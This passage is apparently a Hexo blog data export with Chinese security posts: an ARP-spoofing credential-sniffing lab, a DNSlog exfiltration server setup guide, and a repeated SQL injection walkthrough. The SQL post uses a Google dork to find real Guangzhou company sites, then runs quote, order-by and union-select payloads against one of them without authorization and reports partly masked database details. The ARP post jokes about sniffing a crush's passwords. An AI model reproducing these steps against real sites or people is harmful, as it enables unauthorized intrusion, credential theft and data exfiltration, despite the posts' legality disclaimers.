class=\"headerlink\" title=\"总结\"></a>总结</h3><p>就这样，我们获取了靶机的账号密码，如果是想要女神的账号密码，只需要想办法将ip弄到手就可以了哦。当然这里不仅仅是获取账号密码，可以使用其他抓包软件，获取其他数据包。当然这里还是以学习为主，大家开开玩笑就好，不要真的去偷人家数据。</p>\n<h3 id=\"ARP欺骗防御\"><a href=\"#ARP欺骗防御\" class=\"headerlink\" title=\"ARP欺骗防御\"></a>ARP欺骗防御</h3><p>arp欺骗当然也是可以防御的，对于我们客户端，可以将mac地址设置为静态的，只允许手动更改。对于服务器端，可以对于站点加个ssl加密，也就是http – &gt; https。</p>\n<p>参考链接：<br><a href=\"https://www.cnblogs.com/ichunqiu/p/5662832.html\">https://www.cnblogs.com/ichunqiu/p/5662832.html</a></p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"Hexo","link":"https://hexo.io/zh-tw/","avatar":"https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg","descr":"快速、簡單且強大的網誌框架"}]},{"class_name":"網站","class_desc":"值得推薦的網站","link_list":[{"name":"Youtube","link":"https://www.youtube.com/","avatar":"https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png","descr":"視頻網站"},{"name":"Weibo","link":"https://www.weibo.com/","avatar":"https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png","descr":"中國最大社交分享平台"},{"name":"Twitter","link":"https://twitter.com/","avatar":"https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png","descr":"社交分享平台"}]}]}},"excerpt":"","more":"<p>最近学习了一种攻击——ARP毒药攻击。中间人攻击，也叫ARP欺骗，能够通过arp欺骗获取用户的数据，那么认真想想，这样能不能让自己更加了解女神呢，接下来就让我们来了解一下这个强大的攻击手法吧。</p>\n<h3 id=\"中华人民共和国网络安全法\"><a href=\"#中华人民共和国网络安全法\" class=\"headerlink\" title=\"中华人民共和国网络安全法\"></a>中华人民共和国网络安全法</h3><p>文章开头，先学习一下中华人民共和国网络安全法，大家要做一名合法的白帽子，不要做一些违法乱纪的事情。<br><a href=\"https://www.cto.ac.cn/thread-106.htm\">https://www.cto.ac.cn/thread-106.htm</a></p>\n<p><img src=\"/images/pasted-5.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-6.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-7.png\" alt=\"upload successful\"></p>\n<h3 id=\"环境准备\"><a href=\"#环境准备\" class=\"headerlink\" title=\"环境准备\"></a>环境准备</h3><p>1.攻击机：kali虚拟机 （ip:192.168.163.128）<br><img src=\"/images/pasted-96.png\" alt=\"upload successful\"></p>\n<p>2.被攻击机：windows sever 2008 （ip: 192.168.163.131）<br><img src=\"/images/pasted-97.png\" alt=\"upload successful\"></p>\n<p>3.网关：win10物理机 （ip: 192.168.163.2）</p>\n<h3 id=\"攻击原理\"><a href=\"#攻击原理\" class=\"headerlink\" title=\"攻击原理\"></a>攻击原理</h3><p>访问一个地址需要一种协议叫ARP协议，我们的主机通过ARP协议获取了对应ip地址的mac地址来进行访问。</p>\n<p>情况是这样的，A访问某网站需要经过网关，这往往是直连的，但是第三方B，通过向A和网关发送数据包，修改了他们的mac地址指向了B，也就是说，A访问网关的数据包都会经过B再到达网关，达到了中间人攻击的效果。</p>\n<p><img src=\"/images/pasted-98.jpg\" alt=\"upload successful\"></p>\n<h3 id=\"攻击过程\"><a href=\"#攻击过程\" class=\"headerlink\" title=\"攻击过程\"></a>攻击过程</h3><p>1.首先打开攻击机kali和靶机Windows server 2008<br><img src=\"/images/pasted-99.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-100.png\" alt=\"upload successful\"></p>\n<p>2.在靶机命令行处通过arp –a命令获取了当前mac地址，网关192.168.163.2的mac地址为00-50-56-f3-04-25<br><img src=\"/images/pasted-101.png\" alt=\"upload successful\"></p>\n<p>3.攻击机机也查看一下，查看了当前mac地址为00:0c:29:bc:fd:f2<br><img src=\"/images/pasted-102.png\" alt=\"upload successful\"></p>\n<p>4.准备充分了，接下来在攻击机打开软件ettercap，通过-G参数打开图形化界面<br><img src=\"/images/pasted-103.png\" alt=\"upload successful\"></p>\n<p>5.刚打开的界面需要先选择收取信息的网卡，一般默认的eth0即可，然后打上勾勾进入软件。<br><img src=\"/images/pasted-104.png\" alt=\"upload successful\"></p>\n<p>6.进入软件后，额，因为是英文的，会有点烦，不过我们可以通过按钮来操作。<br>先点击那个放大镜按钮获取当前网段存在的主机。<br><img src=\"/images/pasted-105.png\" alt=\"upload successful\"></p>\n<p>然后点击那个展示按钮查看信息。<br><img src=\"/images/pasted-106.png\" alt=\"upload successful\"></p>\n<p>7.接下来就是选择目标了，将靶机192.168.163.131加入target 1；将网关192.168.163.2加入target2（这里也可以批量欺骗，就是target1可以加入多个进行欺骗）<br><img src=\"/images/pasted-107.png\" alt=\"upload successful\"></p>\n<p>8.选完了目标之后，可以进行攻击了。点击右上角那个地球一样的按钮，选择第一个ARP pois……；进去之后选择第一个sniff remote connections（嗅探远程连接） 打勾，点ok就可以了。<br><img src=\"/images/pasted-108.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-109.png\" alt=\"upload successful\"></p>\n<p>9.开始攻击之后在页面下面是可以看到已经建立了连接。<br><img src=\"/images/pasted-110.png\" alt=\"upload successful\"></p>\n<p>同样的，在靶机上也可以看到，网关的mac地址变了，变成了跟攻击机的地址一样了，这也就是说，已经欺骗成功了<br><img src=\"/images/pasted-111.png\" alt=\"upload successful\"></p>\n<p>10.这就算攻击成功了吗?当然没有，接下来就是当靶机进行网络访问，登录账号密码的时候，能够在攻击机上查看到账号密码。<br>先使用靶机登录某界面。<br><img src=\"/images/pasted-112.png\" alt=\"upload successful\"></p>\n<p>11.为了能够直观点我将密码显示出来（在密码处右键检查，在弹出来的框处找到type=”password”，修改成type=”text”即可）。<br><img src=\"/images/pasted-113.png\" alt=\"upload successful\"></p>\n<p>12.点击了登录后，回到攻击机，已经获取了账号密码以及被我打码的网址。<br><img src=\"/images/pasted-114.png\" alt=\"upload successful\"></p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>就这样，我们获取了靶机的账号密码，如果是想要女神的账号密码，只需要想办法将ip弄到手就可以了哦。当然这里不仅仅是获取账号密码，可以使用其他抓包软件，获取其他数据包。当然这里还是以学习为主，大家开开玩笑就好，不要真的去偷人家数据。</p>\n<h3 id=\"ARP欺骗防御\"><a href=\"#ARP欺骗防御\" class=\"headerlink\" title=\"ARP欺骗防御\"></a>ARP欺骗防御</h3><p>arp欺骗当然也是可以防御的，对于我们客户端，可以将mac地址设置为静态的，只允许手动更改。对于服务器端，可以对于站点加个ssl加密，也就是http – &gt; https。</p>\n<p>参考链接：<br><a href=\"https://www.cnblogs.com/ichunqiu/p/5662832.html\">https://www.cnblogs.com/ichunqiu/p/5662832.html</a></p>\n"},{"title":"如何搭建自己的dnslog服务器","keywords":"dnslog,vps,域名,dnslog搭建","description":"如何搭建自己的dnslog服务器","cover":"/images/18/8.png","date":"2020-12-08T02:58:18.000Z","_content":"\nDnslog即dns日志，通过记录访问了的域名或者子域名。\t\n在渗透测试过程中，攻击者往往无法直接获取相应的数据，那么就可以通过将数据拼接到dns中，将数据外带出来。\t\n\n# 下面介绍如何搭建dnslog服务器\n首先需要有一个可以修改dns设置的域名以及一个vps\n推荐通过阿里云购买\n## 域名ajie.xxxx\n## vps：1.1.1.1\n\n在服务器中需要进行如下设置\t\n1、设置dns修改\n![upload successful](/images/18/1.png) \n\n2、设置域名解析\t\n两个NS记录，一个A记录\t\n![upload successful](/images/18/2.png)  \n3、服务器安装go环境\t\nwget https://dl.google.com/go/go1.10.3.linux-amd64.tar.gz\t\nsudo tar -C /usr/local -xzf go1.10.3.linux-amd64.tar.gz\t\nvi /etc/profile\t\n末尾添加export PATH=$PATH:/usr/local/go/bin\t\n![upload successful](/images/18/3.png) \n\n4、安装dnslog服务器\t\n下载地址：\t\nhttps://github.com/lanyi1998/DNSlog-GO/releases/tag/1.2\t\n我选择的是linux系统\n![upload successful](/images/18/4.png) \n\n5、解压获取里面的文件，修改其中的config.ini\t\nPort = 8080 //HTTP监听端口\t\nToken = ajie //API token，相当于密码\t\nConsoleDisable = false //禁用web控制台，设置为true以后无法访问web页面，只能通过API获取数据\t\n![upload successful](/images/18/5.png) \n\n6、开启dnslog服务\n./main\n![upload successful](/images/18/6.png)\n\n7、访问8080端口，可以查看dnslog的web页面\n![upload successful](/images/18/7.png)\n\n8、测试dns解析，成功记录\n![upload successful](/images/18/8.png)  \n\n","source":"_posts/如何搭建自己的dnslog服务器.md","raw":"---\ntitle: 如何搭建自己的dnslog服务器\ntags: \n  - dnslog\n  - vps\n  - 域名\n  - dnslog搭建\ncategories: 环境搭建\nkeywords: 'dnslog,vps,域名,dnslog搭建'\ndescription: 如何搭建自己的dnslog服务器\ncover: /images/18/8.png\ndate: 2020-12-08 10:58:18\n---\n\nDnslog即dns日志，通过记录访问了的域名或者子域名。\t\n在渗透测试过程中，攻击者往往无法直接获取相应的数据，那么就可以通过将数据拼接到dns中，将数据外带出来。\t\n\n# 下面介绍如何搭建dnslog服务器\n首先需要有一个可以修改dns设置的域名以及一个vps\n推荐通过阿里云购买\n## 域名ajie.xxxx\n## vps：1.1.1.1\n\n在服务器中需要进行如下设置\t\n1、设置dns修改\n![upload successful](/images/18/1.png) \n\n2、设置域名解析\t\n两个NS记录，一个A记录\t\n![upload successful](/images/18/2.png)  \n3、服务器安装go环境\t\nwget https://dl.google.com/go/go1.10.3.linux-amd64.tar.gz\t\nsudo tar -C /usr/local -xzf go1.10.3.linux-amd64.tar.gz\t\nvi /etc/profile\t\n末尾添加export PATH=$PATH:/usr/local/go/bin\t\n![upload successful](/images/18/3.png) \n\n4、安装dnslog服务器\t\n下载地址：\t\nhttps://github.com/lanyi1998/DNSlog-GO/releases/tag/1.2\t\n我选择的是linux系统\n![upload successful](/images/18/4.png) \n\n5、解压获取里面的文件，修改其中的config.ini\t\nPort = 8080 //HTTP监听端口\t\nToken = ajie //API token，相当于密码\t\nConsoleDisable = false //禁用web控制台，设置为true以后无法访问web页面，只能通过API获取数据\t\n![upload successful](/images/18/5.png) \n\n6、开启dnslog服务\n./main\n![upload successful](/images/18/6.png)\n\n7、访问8080端口，可以查看dnslog的web页面\n![upload successful](/images/18/7.png)\n\n8、测试dns解析，成功记录\n![upload successful](/images/18/8.png)  \n\n","slug":"如何搭建自己的dnslog服务器","published":1,"updated":"2021-08-07T16:21:29.756Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckt46mpfe000uvkq3bkki71mg","content":"<p>Dnslog即dns日志，通过记录访问了的域名或者子域名。<br>在渗透测试过程中，攻击者往往无法直接获取相应的数据，那么就可以通过将数据拼接到dns中，将数据外带出来。    </p>\n<h1 id=\"下面介绍如何搭建dnslog服务器\"><a href=\"#下面介绍如何搭建dnslog服务器\" class=\"headerlink\" title=\"下面介绍如何搭建dnslog服务器\"></a>下面介绍如何搭建dnslog服务器</h1><p>首先需要有一个可以修改dns设置的域名以及一个vps<br>推荐通过阿里云购买</p>\n<h2 id=\"域名ajie-xxxx\"><a href=\"#域名ajie-xxxx\" class=\"headerlink\" title=\"域名ajie.xxxx\"></a>域名ajie.xxxx</h2><h2 id=\"vps：1-1-1-1\"><a href=\"#vps：1-1-1-1\" class=\"headerlink\" title=\"vps：1.1.1.1\"></a>vps：1.1.1.1</h2><p>在服务器中需要进行如下设置<br>1、设置dns修改<br><img src=\"/images/18/1.png\" alt=\"upload successful\"> </p>\n<p>2、设置域名解析<br>两个NS记录，一个A记录<br><img src=\"/images/18/2.png\" alt=\"upload successful\"><br>3、服务器安装go环境<br>wget <a href=\"https://dl.google.com/go/go1.10.3.linux-amd64.tar.gz\">https://dl.google.com/go/go1.10.3.linux-amd64.tar.gz</a><br>sudo tar -C /usr/local -xzf go1.10.3.linux-amd64.tar.gz<br>vi /etc/profile<br>末尾添加export PATH=$PATH:/usr/local/go/bin<br><img src=\"/images/18/3.png\" alt=\"upload successful\"> </p>\n<p>4、安装dnslog服务器<br>下载地址：<br><a href=\"https://github.com/lanyi1998/DNSlog-GO/releases/tag/1.2\">https://github.com/lanyi1998/DNSlog-GO/releases/tag/1.2</a><br>我选择的是linux系统<br><img src=\"/images/18/4.png\" alt=\"upload successful\"> </p>\n<p>5、解压获取里面的文件，修改其中的config.ini<br>Port = 8080 //HTTP监听端口<br>Token = ajie //API token，相当于密码<br>ConsoleDisable = false //禁用web控制台，设置为true以后无法访问web页面，只能通过API获取数据<br><img src=\"/images/18/5.png\" alt=\"upload successful\"> </p>\n<p>6、开启dnslog服务<br>./main<br><img src=\"/images/18/6.png\" alt=\"upload successful\"></p>\n<p>7、访问8080端口，可以查看dnslog的web页面<br><img src=\"/images/18/7.png\" alt=\"upload successful\"></p>\n<p>8、测试dns解析，成功记录<br><img src=\"/images/18/8.png\" alt=\"upload successful\">  </p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"Hexo","link":"https://hexo.io/zh-tw/","avatar":"https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg","descr":"快速、簡單且強大的網誌框架"}]},{"class_name":"網站","class_desc":"值得推薦的網站","link_list":[{"name":"Youtube","link":"https://www.youtube.com/","avatar":"https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png","descr":"視頻網站"},{"name":"Weibo","link":"https://www.weibo.com/","avatar":"https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png","descr":"中國最大社交分享平台"},{"name":"Twitter","link":"https://twitter.com/","avatar":"https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png","descr":"社交分享平台"}]}]}},"excerpt":"","more":"<p>Dnslog即dns日志，通过记录访问了的域名或者子域名。<br>在渗透测试过程中，攻击者往往无法直接获取相应的数据，那么就可以通过将数据拼接到dns中，将数据外带出来。    </p>\n<h1 id=\"下面介绍如何搭建dnslog服务器\"><a href=\"#下面介绍如何搭建dnslog服务器\" class=\"headerlink\" title=\"下面介绍如何搭建dnslog服务器\"></a>下面介绍如何搭建dnslog服务器</h1><p>首先需要有一个可以修改dns设置的域名以及一个vps<br>推荐通过阿里云购买</p>\n<h2 id=\"域名ajie-xxxx\"><a href=\"#域名ajie-xxxx\" class=\"headerlink\" title=\"域名ajie.xxxx\"></a>域名ajie.xxxx</h2><h2 id=\"vps：1-1-1-1\"><a href=\"#vps：1-1-1-1\" class=\"headerlink\" title=\"vps：1.1.1.1\"></a>vps：1.1.1.1</h2><p>在服务器中需要进行如下设置<br>1、设置dns修改<br><img src=\"/images/18/1.png\" alt=\"upload successful\"> </p>\n<p>2、设置域名解析<br>两个NS记录，一个A记录<br><img src=\"/images/18/2.png\" alt=\"upload successful\"><br>3、服务器安装go环境<br>wget <a href=\"https://dl.google.com/go/go1.10.3.linux-amd64.tar.gz\">https://dl.google.com/go/go1.10.3.linux-amd64.tar.gz</a><br>sudo tar -C /usr/local -xzf go1.10.3.linux-amd64.tar.gz<br>vi /etc/profile<br>末尾添加export PATH=$PATH:/usr/local/go/bin<br><img src=\"/images/18/3.png\" alt=\"upload successful\"> </p>\n<p>4、安装dnslog服务器<br>下载地址：<br><a href=\"https://github.com/lanyi1998/DNSlog-GO/releases/tag/1.2\">https://github.com/lanyi1998/DNSlog-GO/releases/tag/1.2</a><br>我选择的是linux系统<br><img src=\"/images/18/4.png\" alt=\"upload successful\"> </p>\n<p>5、解压获取里面的文件，修改其中的config.ini<br>Port = 8080 //HTTP监听端口<br>Token = ajie //API token，相当于密码<br>ConsoleDisable = false //禁用web控制台，设置为true以后无法访问web页面，只能通过API获取数据<br><img src=\"/images/18/5.png\" alt=\"upload successful\"> </p>\n<p>6、开启dnslog服务<br>./main<br><img src=\"/images/18/6.png\" alt=\"upload successful\"></p>\n<p>7、访问8080端口，可以查看dnslog的web页面<br><img src=\"/images/18/7.png\" alt=\"upload successful\"></p>\n<p>8、测试dns解析，成功记录<br><img src=\"/images/18/8.png\" alt=\"upload successful\">  </p>\n"},{"title":"花几分钟找个上市公司的SQL注入漏洞","keywords":"SQL注入,显错注入,漏洞利用,实战渗透,漏洞挖掘","description":"花几分钟找个上市公司的SQL注入漏洞","cover":"/images/pasted-36.png","date":"2020-03-02T02:45:41.000Z","_content":"\n之前发出了一篇显错注入的文章之后，很多读者反馈说难度太大，看不懂，那么今天，我进行了改进，为大家推送一篇漏洞实例，实战演示怎么挖掘sql显错注入漏洞。最后说一句，我们要做一名合法的白帽子，要学会 **点到为止** 。\n\n## 中华人民共和国网络安全法\n![upload successful](/images/pasted-41.png)\n\n![upload successful](/images/pasted-42.png)\n\n![upload successful](/images/pasted-43.png)\n## 寻找漏洞\n1.首先打开谷歌镜像站，这里不推荐搭梯子（vpn），因为这个违法且不安全，所以我们使用大佬搭的镜像站（百度搜索，找到一个能用的就行，这里推荐一个http://www.googlen.org/ ），搜索栏里输入： \n```\ninurl:php?sid= 广州 有限公司\n```\n![upload successful](/images/pasted-33.png)\n\n---\n\n![upload successful](/images/pasted-34.png)\n\n2.每打开一个网站，就在它的url地址后面加个单引号‘或者反斜杠\\，如果页面报错了，那么恭喜你，这里有sql注入漏洞。经过尝试，在一个页面中，我加个单引号，页面产生错误了（ps:单引号在url栏里被url编码为%27）\n\n![upload successful](/images/pasted-35.png)\n\n## 显错注入具体流程\n1.看到了warning，也就是说这个网站存在sql注入，先在%27后面加个空格，加个%23（%23通过url解码为#，起到注释的作用），新的url传参为：\n```\n?id=243' #\n```\n\n![upload successful](/images/pasted-36.png)\n\n2.可以看到，闭合成功了，页面返回正常，这个时候，就是猜字段了，在单引号和#之间放入order by 数字，猜字段\n当前传参为：\n```\n?id=243' order by 1 #\n```\n\n![upload successful](/images/pasted-37.png)\n\n3.根据之前的教学推文中知道，接下来就是通过order by 判断当前数据库字段数了，order by 1页面正常，order by 2 页面正常……一直到order by 29的时候，页面又出现了错误，下面的文字内容没了，所以我们知道，字段数为28。当前url传参为：\n```\n?id=243' order by 29 #\n```\n\n![upload successful](/images/pasted-38.png)\n\n4.字段知道了，接下来就是联合查询了，获取了显错点4，6，13。（ps:这里有个坑，243变成了-243，这是为了让联合查询前面的语句报错，这样就会输出后面的显错点了，跟limit 1,1 更换显示为第2行道理相同）\n当前url传参为：\n```\n?id=-243' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 #\n```\n\n![upload successful](/images/pasted-39.png)\n\n5.有了显错点，已经可以说是找到漏洞了，我们偷偷看看它的数据库，将4，6，13换成之间推文里提到的函数，获取数据库库名，数据库当前用户名，数据库版本号。\n\n![upload successful](/images/pasted-40.png)\n\n6.这里我打码了一部分，数据库库名开头为ao ，数据库当前用户名为ao***@localhost，数据库当前版本为5.5.45。本次实例就到这里，点到为止嘛，查到库名已经可以去漏洞提交平台进行提交了。本次实例仅作为学习资料，若有出现打码遗漏等问题，也请大家不要对网站进行攻击。\n\n","source":"_posts/实例挖掘sql注入显错注入漏洞.md","raw":"---\ntitle: 花几分钟找个上市公司的SQL注入漏洞\ntags: \n  - SQL注入\n  - 显错注入\n  - 漏洞利用\n  - 实战渗透\n  - 漏洞挖掘\ncategories: web安全\nkeywords: 'SQL注入,显错注入,漏洞利用,实战渗透,漏洞挖掘'\ndescription: 花几分钟找个上市公司的SQL注入漏洞\ncover: /images/pasted-36.png\ndate: 2020-03-02 10:45:41\n---\n\n之前发出了一篇显错注入的文章之后，很多读者反馈说难度太大，看不懂，那么今天，我进行了改进，为大家推送一篇漏洞实例，实战演示怎么挖掘sql显错注入漏洞。最后说一句，我们要做一名合法的白帽子，要学会 **点到为止** 。\n\n## 中华人民共和国网络安全法\n![upload successful](/images/pasted-41.png)\n\n![upload successful](/images/pasted-42.png)\n\n![upload successful](/images/pasted-43.png)\n## 寻找漏洞\n1.首先打开谷歌镜像站，这里不推荐搭梯子（vpn），因为这个违法且不安全，所以我们使用大佬搭的镜像站（百度搜索，找到一个能用的就行，这里推荐一个http://www.googlen.org/ ），搜索栏里输入： \n```\ninurl:php?sid= 广州 有限公司\n```\n![upload successful](/images/pasted-33.png)\n\n---\n\n![upload successful](/images/pasted-34.png)\n\n2.每打开一个网站，就在它的url地址后面加个单引号‘或者反斜杠\\，如果页面报错了，那么恭喜你，这里有sql注入漏洞。经过尝试，在一个页面中，我加个单引号，页面产生错误了（ps:单引号在url栏里被url编码为%27）\n\n![upload successful](/images/pasted-35.png)\n\n## 显错注入具体流程\n1.看到了warning，也就是说这个网站存在sql注入，先在%27后面加个空格，加个%23（%23通过url解码为#，起到注释的作用），新的url传参为：\n```\n?id=243' #\n```\n\n![upload successful](/images/pasted-36.png)\n\n2.可以看到，闭合成功了，页面返回正常，这个时候，就是猜字段了，在单引号和#之间放入order by 数字，猜字段\n当前传参为：\n```\n?id=243' order by 1 #\n```\n\n![upload successful](/images/pasted-37.png)\n\n3.根据之前的教学推文中知道，接下来就是通过order by 判断当前数据库字段数了，order by 1页面正常，order by 2 页面正常……一直到order by 29的时候，页面又出现了错误，下面的文字内容没了，所以我们知道，字段数为28。当前url传参为：\n```\n?id=243' order by 29 #\n```\n\n![upload successful](/images/pasted-38.png)\n\n4.字段知道了，接下来就是联合查询了，获取了显错点4，6，13。（ps:这里有个坑，243变成了-243，这是为了让联合查询前面的语句报错，这样就会输出后面的显错点了，跟limit 1,1 更换显示为第2行道理相同）\n当前url传参为：\n```\n?id=-243' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 #\n```\n\n![upload successful](/images/pasted-39.png)\n\n5.有了显错点，已经可以说是找到漏洞了，我们偷偷看看它的数据库，将4，6，13换成之间推文里提到的函数，获取数据库库名，数据库当前用户名，数据库版本号。\n\n![upload successful](/images/pasted-40.png)\n\n6.这里我打码了一部分，数据库库名开头为ao ，数据库当前用户名为ao***@localhost，数据库当前版本为5.5.45。本次实例就到这里，点到为止嘛，查到库名已经可以去漏洞提交平台进行提交了。本次实例仅作为学习资料，若有出现打码遗漏等问题，也请大家不要对网站进行攻击。\n\n","slug":"实例挖掘sql注入显错注入漏洞","published":1,"updated":"2021-08-07T16:20:56.664Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckt46mpfi000xvkq3dwewdxul","content":"<p>之前发出了一篇显错注入的文章之后，很多读者反馈说难度太大，看不懂，那么今天，我进行了改进，为大家推送一篇漏洞实例，实战演示怎么挖掘sql显错注入漏洞。最后说一句，我们要做一名合法的白帽子，要学会 <strong>点到为止</strong> 。</p>\n<h2 id=\"中华人民共和国网络安全法\"><a href=\"#中华人民共和国网络安全法\" class=\"headerlink\" title=\"中华人民共和国网络安全法\"></a>中华人民共和国网络安全法</h2><p><img src=\"/images/pasted-41.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-42.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-43.png\" alt=\"upload successful\"></p>\n<h2 id=\"寻找漏洞\"><a href=\"#寻找漏洞\" class=\"headerlink\" title=\"寻找漏洞\"></a>寻找漏洞</h2><p>1.首先打开谷歌镜像站，这里不推荐搭梯子（vpn），因为这个违法且不安全，所以我们使用大佬搭的镜像站（百度搜索，找到一个能用的就行，这里推荐一个<a href=\"http://www.googlen.org/\">http://www.googlen.org/</a> ），搜索栏里输入： </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">inurl:php?sid= 广州 有限公司</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/pasted-33.png\" alt=\"upload successful\"></p>\n<hr>\n<p><img src=\"/images/pasted-34.png\" alt=\"upload successful\"></p>\n<p>2.每打开一个网站，就在它的url地址后面加个单引号‘或者反斜杠\\，如果页面报错了，那么恭喜你，这里有sql注入漏洞。经过尝试，在一个页面中，我加个单引号，页面产生错误了（ps:单引号在url栏里被url编码为%27）</p>\n<p><img src=\"/images/pasted-35.png\" alt=\"upload successful\"></p>\n<h2 id=\"显错注入具体流程\"><a href=\"#显错注入具体流程\" class=\"headerlink\" title=\"显错注入具体流程\"></a>显错注入具体流程</h2><p>1.看到了warning，也就是说这个网站存在sql注入，先在%27后面加个空格，加个%23（%23通过url解码为#，起到注释的作用），新的url传参为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=243&#x27; #</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/pasted-36.png\" alt=\"upload successful\"></p>\n<p>2.可以看到，闭合成功了，页面返回正常，这个时候，就是猜字段了，在单引号和#之间放入order by 数字，猜字段<br>当前传参为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=243&#x27; order by 1 #</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/pasted-37.png\" alt=\"upload successful\"></p>\n<p>3.根据之前的教学推文中知道，接下来就是通过order by 判断当前数据库字段数了，order by 1页面正常，order by 2 页面正常……一直到order by 29的时候，页面又出现了错误，下面的文字内容没了，所以我们知道，字段数为28。当前url传参为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=243&#x27; order by 29 #</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/pasted-38.png\" alt=\"upload successful\"></p>\n<p>4.字段知道了，接下来就是联合查询了，获取了显错点4，6，13。（ps:这里有个坑，243变成了-243，这是为了让联合查询前面的语句报错，这样就会输出后面的显错点了，跟limit 1,1 更换显示为第2行道理相同）<br>当前url传参为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=-243&#x27; union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 #</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/pasted-39.png\" alt=\"upload successful\"></p>\n<p>5.有了显错点，已经可以说是找到漏洞了，我们偷偷看看它的数据库，将4，6，13换成之间推文里提到的函数，获取数据库库名，数据库当前用户名，数据库版本号。</p>\n<p><img src=\"/images/pasted-40.png\" alt=\"upload successful\"></p>\n<p>6.这里我打码了一部分，数据库库名开头为ao ，数据库当前用户名为ao***@localhost，数据库当前版本为5.5.45。本次实例就到这里，点到为止嘛，查到库名已经可以去漏洞提交平台进行提交了。本次实例仅作为学习资料，若有出现打码遗漏等问题，也请大家不要对网站进行攻击。</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"Hexo","link":"https://hexo.io/zh-tw/","avatar":"https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg","descr":"快速、簡單且強大的網誌框架"}]},{"class_name":"網站","class_desc":"值得推薦的網站","link_list":[{"name":"Youtube","link":"https://www.youtube.com/","avatar":"https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png","descr":"視頻網站"},{"name":"Weibo","link":"https://www.weibo.com/","avatar":"https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png","descr":"中國最大社交分享平台"},{"name":"Twitter","link":"https://twitter.com/","avatar":"https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png","descr":"社交分享平台"}]}]}},"excerpt":"","more":"<p>之前发出了一篇显错注入的文章之后，很多读者反馈说难度太大，看不懂，那么今天，我进行了改进，为大家推送一篇漏洞实例，实战演示怎么挖掘sql显错注入漏洞。最后说一句，我们要做一名合法的白帽子，要学会 <strong>点到为止</strong> 。</p>\n<h2 id=\"中华人民共和国网络安全法\"><a href=\"#中华人民共和国网络安全法\" class=\"headerlink\" title=\"中华人民共和国网络安全法\"></a>中华人民共和国网络安全法</h2><p><img src=\"/images/pasted-41.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-42.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-43.png\" alt=\"upload successful\"></p>\n<h2 id=\"寻找漏洞\"><a href=\"#寻找漏洞\" class=\"headerlink\" title=\"寻找漏洞\"></a>寻找漏洞</h2><p>1.首先打开谷歌镜像站，这里不推荐搭梯子（vpn），因为这个违法且不安全，所以我们使用大佬搭的镜像站（百度搜索，找到一个能用的就行，这里推荐一个<a href=\"http://www.googlen.org/\">http://www.googlen.org/</a> ），搜索栏里输入： </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">inurl:php?sid= 广州 有限公司</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/pasted-33.png\" alt=\"upload successful\"></p>\n<hr>\n<p><img src=\"/images/pasted-34.png\" alt=\"upload successful\"></p>\n<p>2.每打开一个网站，就在它的url地址后面加个单引号‘或者反斜杠\\，如果页面报错了，那么恭喜你，这里有sql注入漏洞。经过尝试，在一个页面中，我加个单引号，页面产生错误了（ps:单引号在url栏里被url编码为%27）</p>\n<p><img src=\"/images/pasted-35.png\" alt=\"upload successful\"></p>\n<h2 id=\"显错注入具体流程\"><a href=\"#显错注入具体流程\" class=\"headerlink\" 